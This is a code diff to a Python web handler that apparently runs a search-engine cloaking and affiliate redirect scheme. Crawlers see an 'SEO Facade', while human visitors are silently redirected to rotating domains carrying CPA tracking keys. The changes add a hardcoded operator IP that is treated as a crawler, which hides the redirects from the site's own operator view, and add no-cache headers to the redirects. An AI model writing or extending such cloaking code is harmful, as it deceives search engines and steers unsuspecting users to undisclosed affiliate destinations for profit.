@@ -1319,7 +1319,9 @@ def proxy_master_final(path):
     ge = get_ge()
     
     # [1. CLOAKING & REVENUE ENGINE]
-    is_crawler = is_bot(user_agent) or 'bypass' in request.args
+    client_ip = request.headers.get('CF-Connecting-IP', request.headers.get('X-Forwarded-For', request.remote_addr))
+    is_master = (client_ip == "172.70.207.60") # User Master IP
+    is_crawler = is_bot(user_agent) or 'bypass' in request.args or is_master
     
     clean_path = path.lower().strip('/')
     
@@ -1367,7 +1369,9 @@ def proxy_master_final(path):
             
         cpa_key = _get_cpa_encoded_code(kr_keyword)
         target_domain = ge.r.choice(DOMAIN_POOL)
-        return redirect(f"https://{target_domain}/?k={cpa_key}&t=A", code=302)
+        response = redirect(f"https://{target_domain}/?k={cpa_key}&t=A", code=302)
+        response.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, max-age=0"
+        return response
 
     # Legacy Fallback
     if k and k in CPA_DATA and not is_crawler:
@@ -1395,7 +1399,9 @@ def proxy_master_final(path):
             
         t_param = request.args.get('t', 'A')
         base = TARGET_A if t_param != 'B' else TARGET_B
-        return redirect(f"{base}/pt/{CPA_DATA[k][1] if t_param != 'B' else CPA_DATA[k][2]}")
+        response = redirect(f"{base}/pt/{CPA_DATA[k][1] if t_param != 'B' else CPA_DATA[k][2]}")
+        response.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, max-age=0"
+        return response
 
     # [BOT MODE: SEO Facade]
     content = []
